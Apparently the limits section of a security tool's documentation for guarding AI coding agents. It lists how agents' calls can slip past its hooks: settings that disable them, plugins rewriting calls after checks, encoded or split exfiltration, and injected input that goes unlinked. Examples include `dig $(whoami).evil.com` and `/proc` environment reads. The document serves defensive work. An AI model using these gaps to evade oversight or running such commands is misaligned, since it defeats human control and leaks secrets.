| Crush | blocks the call | blocks the call: OpenMoat's guard answers deny at 30 s, before the agent's limit; runs it only when the guard cannot answer at all (stopped, or killed with the hook command) | 600 s | deleting the entry: no setting turns hooks off, and the hooks of every configuration file are appended to one another | no | [1](https://github.com/charmbracelet/crush/blob/main/docs/hooks/README.md) [2](https://github.com/charmbracelet/crush/blob/main/internal/hooks/runner.go) |
| Continue CLI | runs the call | runs the call | 600 s | always: the released Continue CLI fires no hook | yes: cannot start, crashes or exits non-zero; times out | [1](https://github.com/continuedev/continue/blob/main/extensions/cli/src/hooks/hookRunner.ts) |
<!-- /generated -->
- **Agent settings can turn hooks off.** Codex runs a new or changed hook only once you
  trust it in its `/hooks` view, and settings such as `disableAllHooks` (Claude Code,
  Copilot CLI) or `[features] hooks = false` (Codex) turn hooks off. `openmoat status`
  and `openmoat doctor` report the settings they can see. An agent's write of a
  project's `.codex/config.toml`, `.pi/settings.json` or `opencode.json` that turns the
  hook off is denied (`project-settings`) when OpenMoat knows the content the write
  leaves: a whole-file write, an edit whose text is found in the file as it is, or an
  `apply_patch` that replays on it. A shell command that creates or replaces one of
  those files where the agent would load it (a redirect, `tee`, `cp` or `mv` onto it,
  `sed -i`, in the working directory or at the project root, for an agent OpenMoat is
  set up for) is denied too (`project-settings`): what it leaves cannot be known
  before it runs, so make that change with the agent's file tools or by hand. Reading
  those files, removing them, moving them away and a same-named file elsewhere (a
  template or test fixture) keep their verdict. Any other write of them needs review,
  as every other change there does: an edit or patch that does not replay exactly, a
  tool that sends no content, a shell command that writes a file in a subfolder a later
  session might start in, copies a whole directory over them, names them by a glob or
  a variable it cannot resolve, or is a program OpenMoat cannot read (a script, a
  PowerShell command). An agent that answers reviews on its own (OpenCode 2 `--auto`)
  lets those through, and the next session started there runs without OpenMoat until
  `openmoat status` reports it. A project that comes with such a file (a clone, a
  checkout) is loaded when the session starts: `openmoat run` refuses to start the
  agent over it (ADR-098), but an agent started directly loads it. `openmoat init
  --managed` puts OpenMoat's hook where a project cannot turn it off for Claude Code
  and GitHub Copilot CLI; the other agents have no such place OpenMoat writes.
- **Other hooks run beside OpenMoat's.** A plugin update or a settings edit can add a
  hook command the agent runs at an event OpenMoat never sees, and git runs what a
  repository's `.git/config` names before any hook. OpenMoat cannot stop those programs
  from running; it records each one in the lock (ADR-109) and, while one is new or
  changed, names it in `openmoat status`, `doctor` and `watch` until a person runs
  `openmoat hooks accept`. Only one whose command the policy denies changes the
  agent's calls (they are denied); any other new hook, harmful or not, runs beside
  them unheld unless your policy says `hooks.foreign: hold`. A `SessionStart` hook
  has already run by then. Places the agents' specs do not name
  are not read: Gemini CLI and Qwen Code extensions, GitHub Copilot CLI and Codex
  plugins, other OpenClaw and Hermes Agent plugins, and pi's and OpenCode's user
  extension folders. Calls of tools OpenMoat does not check and MCP calls held by their
  own pins are decided before the ledger.
- **Other plugins share the agent's process.** OpenCode loads other plugins and a
  project's `.opencode/plugins/` at start, with no prompt, and they can change what
  OpenMoat's plugin does; `openmoat status` and `openmoat doctor` warn about a
  project's. A plugin that rewrites a call OpenMoat checked makes that call fail, but
  one can still replace a tool, rename one, or change a shell's directory or
  environment.
- **Some agents can change a call after the check.** Hermes Agent's plugins, another of
  its shell hooks and its tool middleware run in its own process and can rewrite a call's
  arguments after OpenMoat decided; what an `execute_code` script does itself is not
  checked, and its in-session `/yolo` toggle approves a review unseen. A pi extension that
  loads after OpenMoat's can change a call's input. OpenClaw runs the parameters
  OpenMoat decided on, except where another plugin changes them and asks for approval
  itself in one answer: OpenClaw then runs that plugin's change once you approve it.
  In the Cline CLI, another `PreToolUse` hook file or a plugin can rewrite a call's input
  after OpenMoat checked it (`openmoat status` and `doctor` name the ones they find), and
  Cline approves calls on its own by default (`--auto-approve`), so a deferred call
  usually runs.

## Limits of single checks

- **The never-widen check proves some kinds of call, and samples the rest.** `openmoat
  policy diff --widen`, `policy upgrade`, `trust`, `policy install` and the merge check's
  `diff-widens` prove for file, host, fetch, environment and MCP rules that no subject
  widens, when their search finishes. Shell commands, request rules and whole calls (their
  folder, taint and request layers) are checked over the bundled calls, cases made from
  both policies' rules and `--fixtures` files only: a widening for a command none of them
  spells is not found. The output says which kind got which check
  ([POLICY.md §8.3](POLICY.md#83-does-a-change-widen-openmoat-policy-diff---widen-adr-111), ADR-111).
- **A decoy key's value is caught as exact text.** The `canary` check finds a decoy's value
  in a call or a proxied request in any letter case, but not encoded (base64, hex), split
  across calls or rebuilt by a program before it is sent, as for brokered secrets. A
  decoy read where the hook does not see it (by a program the agent started, by a sweep
  such as `grep -r` over the home folder) is caught only when its value goes out through
  a checked call or `openmoat proxy`. Inside `openmoat run` the OS sandbox does not deny
  the decoy files themselves; their values are refused at the run's proxy (ADR-106).
- **Sandboxed start depends on your shell's `PATH`.** The shims start an agent in
  `openmoat run` only from a shell that read the line `openmoat init` added (open a new
  one), and only when it is typed by name: a program started by its full path, by an
  editor or by another tool's own lookup starts outside, as before. `openmoat status`
  says which happens in the current shell. A shim starts the program it found at `init`:
  after the agent moves, or its configuration directory changes, run `openmoat init`
  again. An agent that starts itself again from inside its sandbox finds the shim there
  and cannot start, since the sandbox hides OpenMoat's directory; outside a project
  `openmoat run` refuses to start (ADR-106).
- **Other processes' environments are seen through `ps`, `pargs` and `/proc` only.**
  `env-dump` denies `ps` with the BSD `e` modifier or macOS's `-E`, `pargs -e` and reads of
  `/proc/<pid>/environ`. Not seen: FreeBSD's `ps -e`, which prints the environment there
  but means every process on Linux and macOS and stays allowed; options the line does not
  show (`ps $opts`, `ps $(cat f)`); a program or script that reads them through a system
  call (`sysctl` `KERN_PROCARGS2` on macOS, `psutil`); other tools (`gdb -p`, `lldb`). Under
  `openmoat run` the OS keeps the agent from reading other processes' environments
  whatever the command; outside it, the hook's decision is the only check.

- **DNS exfiltration is seen only in a name with a fixed domain.** A name a resolver or
  client looks up that is built at run time is decided as the domain it ends in
  (`dig $(whoami).evil.com` is denied for an unlisted domain, ADR-102). Not seen: a name
  with nothing fixed after its last expansion (`dig "$DOMAIN"`, `dig $(cat host.txt)`); a
  domain under a top-level domain OpenMoat does not know, which is not taken for a host; a
  host assigned to a variable earlier and used whole (`H=x.evil.com; dig $H`); a lookup
  made by code that builds the name (`python3 -c` with a computed name, a script, a
  program). The OS layers decide those where they apply. `getent`, `drill`, `kdig`,
  `delv` and `resolvectl` now name hosts as `dig` does, so a lookup of an internal name
  under a known top-level domain (`getent hosts db.corp.internal`) is decided as a
  connection to it and denied unless the policy allows that host.

- **After an upgrade, a policy edit or a move to another project, a long session's
  first calls may be refused.** OpenMoat works out the session's taint from its earlier
  calls again under the new version, policy or project, and a call it cannot decide in
  time is denied (`kernel-error`) rather than judged on part of the session. What it read
  is kept, so each try reads on; the agent's after-call hook (Claude Code, Codex, Gemini CLI,
  GitHub Copilot CLI, the Cline CLI) reads on after a call ran too. A move to another folder of the same project
  starts over only when some of the session's calls were recorded without a working
  directory. `openmoat doctor` lists these denials of the last day
  ([ARCHITECTURE.md, "Session cache"](ARCHITECTURE.md)).

- **Injected input is linked only with Claude Code, Codex, Gemini CLI,
  GitHub Copilot CLI, the Cline CLI and wrapped MCP servers, and only for the same
  request.** Other
  agents report no call output (their
  wrapped MCP servers' results are read by the gateway), and the released Continue CLI
  runs no hook at all. A PowerShell command (every
  Gemini CLI shell command on Windows, the PowerShell tools of Claude Code and the Cline
  CLI) is not parsed, so it is linked by the hosts and paths its text names, not by its
  commands. Paths are read in the forms POLICY.md §4.1.2 lists (drive, `~\`,
  `$env:USERPROFILE\`, `%USERPROFILE%\`, `$HOME\`); a UNC path, `${env:USERPROFILE}`,
  another variable, and a host or path built at run time (`"ev" + "il.example"`) are not
  seen. Another spelling of a planted
  address (a percent-encoded one too), a subdomain of a planted URL host, a planted
  command run through a wrapper or written with its program's directory, `./` or `~`, and
  a relative path placed against the directory it was read in are linked; a host by
  another name, a command with its flags re-ordered or other words, and anything the
  model paraphrases, encodes or summarises are not
  ([POLICY.md §4.1.2](POLICY.md#412-injected-input), ADR-113). Data labels (preview,
  ADR-126) follow the source instead of the text, but only where a rule names the flow:
  the default policy names one (an MCP server's result, then another server's acting
  tool), and a label reaches every later sink of the session, since the hook cannot tell
  which output a call used ([POLICY.md §4.7](POLICY.md#47-data-labels-rules-on-where-data-from-a-source-may-go-preview)). Only the output of the shell,
  fetches, searches, MCP resource reads and MCP tools is read (every tool's on Copilot), each kept up to fixed
  bounds, so a page full of decoys can push a planted host out. Fetches, searches and MCP
  calls themselves are not checked against it, and an install without the
  after-call entry (`openmoat init` adds it; Codex runs it once trusted in `/hooks`)
  links nothing
  ([ADR-057](adr/ADR-057-injected-input-and-instruction-files.md)).
- **Sending what a session collected is held only in part.** A send of a file the session
  packed from files outside the project, and any send after it wrote private data into a
  file, need review (`staging-egress`); a send after many outside reads with nothing
  packed is recorded in the audit log and `openmoat report` but not decided until its
  thresholds are measured. A file a `Write` tool fills with private data read in an
  earlier call is not seen as staging, and only reads that went through OpenMoat's hook
  count, not files a script or program read on its own
  ([ADR-061](adr/ADR-061-staging-chain.md), [ADR-113](adr/ADR-113-trifecta-staging-and-argument-conditions.md)).
- **The lethal trifecta needs all three parts in one session.** After private data and
  untrusted content, a call that can send data out needs review (`lethal-trifecta`), but
  private data read in one session and sent from another is not linked, `openmoat run`'s
  proxy applies session taint only, and a way out OpenMoat does not know (a program that
  uploads under another name) is not the third part
  ([POLICY.md §4.6](POLICY.md#46-the-lethal-trifecta)).
- **Argument conditions read what the host sends.** A `when:` condition sees an MCP call's
  arguments as the payload carries them: a server that takes recipients from its own state
  or resolves a contact name to an address is not seen, and a key the condition does not
  name holds a negated condition rather than passing it
  ([POLICY.md §2.4](POLICY.md#24-argument-conditions-when)).
- **The container check reads the flags as written.** `container-host` matches the
  options a `docker`, `podman` or `nerdctl` command line shows; another spelling, or the
  same options in a compose file or a script, is not caught by it
  ([POLICY.md §6](POLICY.md#6-the-default-policy-in-one-table)).
- **A command a container runs is not checked as a command on this machine.** A
  `sh -c 'cmd'` handed to a program OpenMoat does not know (`mywrap sh -c 'cmd'`,
  `poetry run bash -lc 'cmd'`) is checked as `cmd`, but not one handed to `docker`,
  `podman`, `nerdctl`, `kubectl` or `oc`: it runs inside the container or pod, where
  `~/.ssh` is not yours. What the container is given of this machine (`--privileged`,
  `-v /:/host`, the Docker socket) is checked by `container-host`; a folder mounted
  some other way is not.
- **The MCP flow check sees wrapped servers and exact text only.** Results of a server
  not run through `openmoat mcp wrap` (remote HTTP, plugin or managed servers) are not
  recorded, and text the agent rewrites, encodes, splits or shortens below eight words
  is not found; a tool's own annotations or its name decide whether it writes or sends
  ([ADR-058](adr/ADR-058-mcp-cross-server-flow.md)).
- **The card check is narrow and can misfire.** `card-egress` reads only the text a call
  shows: a number in a file (`curl -d @cards.csv`), encoded or split is not seen. A
  contiguous number counts only in a card's context (a card field's value, or beside a
  security code or expiry); a bare id in a URL path, query or search is not a card, but a
  number printed in card groups (`4000 1234 5678 9017`) counts anywhere. `openmoat allow`
  cannot lift a deny: narrow or remove the `card-egress` rule with `openmoat edit`
  ([POLICY.md §4.4](POLICY.md#44-personal-data-on-its-way-out)).
- **The pull request check reads added lines, not programs.** It matches the text a
  change adds (and the lockfile lines it removes), offline, without parsing each
  language or looking anything up: a payload built from pieces at run time, a script
  the change does not touch and a package's age or owner are not checked, and a benign
  line can match (set its level in `check_diff.levels`). A finding is a report: it
  holds a merge only where the job is a required status check
  ([MERGE_CHECK.md](MERGE_CHECK.md#limits)).
- **Provenance notes are local evidence of what the hook saw.** `openmoat provenance`
  knows the writes agent sessions made through calls OpenMoat decided, on the machine
  that made them; a script, an editor or an agent without OpenMoat leaves no record.
  Notes are not signed and can be stripped or left unpushed: a missing note proves
  nothing, a commit with no record is not shown to be a person's, and only the machine
  that wrote a note can verify it; in CI it is a claim
  ([PROVENANCE.md](PROVENANCE.md#limits)).
- **`openmoat serve`'s link reads the audit log while it runs.** Whoever holds the link
  can read every recorded call until the server stops; it stays in the browser's history,
  where it no longer works once the server has stopped. The server is plain HTTP on
  loopback, so a program running as you could read the log file directly anyway; it adds
  nothing for that program, and nothing for another user, a web page or another machine
  without the token ([ADR-066](adr/ADR-066-openmoat-serve.md)).
- **Live audit delivery sends what the log says, masked, and only when calls are made.**
  A sink receives the commands, paths and hosts of every call, with known secrets and
  credential shapes masked; a secret of a shape OpenMoat does not know goes as it was
  recorded. Delivery runs after hook calls and when a person runs `openmoat audit deliver
  flush`, so a machine where no agent runs sends nothing new. A sink that falls more than
  `max_backlog` events behind is told which events it missed, not sent them; they stay in
  the local log. The OTLP bodies follow the specification's JSON encoding and are tested
  against a local test server only, not against a vendor's intake
  ([DELIVERY.md](DELIVERY.md#limits), [ADR-081](adr/ADR-081-live-audit-delivery.md)).

## Snapshots and restore

`openmoat run` takes a snapshot of the project's files before the agent starts and after it
exits, and `openmoat restore` puts them back ([USAGE.md](USAGE.md#put-the-projects-files-back),
[ADR-085](adr/ADR-085-workspace-snapshot-and-restore.md)). A snapshot does not cover:

- **Anything outside the project's files.** Network sends, `git push`, database writes,
  package registries, files outside the project and changes to your home directory are
  not undone.
- **Files a snapshot leaves out.** What the project's `.gitignore` files and
  `.git/info/exclude` ignore (`node_modules/`, build output; your global git excludes
  file is not read), every path a deny rule names (`.env`, keys, an agent's settings,
  `.moat`), anything inside `.git` (branches, history, the index and hooks are not
  restored: use git for those), nested git repositories, files over 5 MiB, sockets and
  pipes, and names that are not UTF-8. Each snapshot names what it left out
  (`openmoat snapshot --list`), and a restore leaves those paths as they are. An ignored
  file that was there when the snapshot was taken is also left as it is, even when the
  project no longer ignores it.
- **Large projects.** Over 100 000 files or 1 GiB to keep, no snapshot is taken (the
  run says so and goes on); ignore the generated folders.
- **Metadata.** Only contents, symbolic links and the executable bit come back: other
  permissions, owners, times, extended attributes and empty folders do not. Symbolic
  links are not restored on Windows.
- **Runs without one.** A run with `--no-snapshot`, a run started from an agent, an agent
  started without `openmoat run`, and changes made between two snapshots inside one session
  (only the start and the end are kept). A failed snapshot is said and recorded; the run
  goes on.
- **A restore while the agent runs.** Stop the agent first: a file it writes during the
  restore can be overwritten or left half-restored. A path whose folder is a link or a file
  now is skipped and named, never written through. On macOS and Linux this holds even
  when the agent swaps a folder for a link while the restore writes: each write and delete
  is made in the folder that was checked, held open. On Windows each folder is checked
  again right before the change, which leaves a moment in which a junction swapped in is
  not seen.
- **Lost files after the retention.** Per project the newest 50 snapshots are kept, none
  older than 14 days (the newest always). The store holds old contents of the project's
  files on this machine until then; `openmoat uninstall --purge` deletes it.

## Team mode

A team bundle and the inventory ([TEAM.md](TEAM.md), ADR-119) work without a server, and
so without anything that can act on a machine from outside it.

- **Updates wait for a person.** Only `openmoat team update`, from the person's terminal,
  installs a newer bundle: an MDM tool or a script that places one in the folder changes
  nothing until then, and `openmoat inventory --check` reports that it waits. A rule the
  team adds today reaches a machine when its person updates.
- **The signer is trusted as given.** `openmoat team join --signer` trusts the key it is
  handed, for team bundles only. A wrong key, taken from a place the team does not
  control, trusts someone else's bundle; joining prints the signer and the rules it
  brings.
- **A bundle narrows only.** It cannot allow anything or set a setting it does not list;
  a team's allow rules go in a pack each person installs. One team per machine.
- **The inventory is the machine's own report.** A machine whose person removes OpenMoat
  or stops the scheduled job reports nothing; a missing report is the signal. The inventory holds no host name, so a fleet tool matches machines by the
  delivery configuration's `machine:` or by where it collected the file.
- **Versions are what the agents' programs report** on the search path of whoever runs
  the inventory; an agent installed elsewhere, or one whose program cannot be asked,
  reports `unknown`.
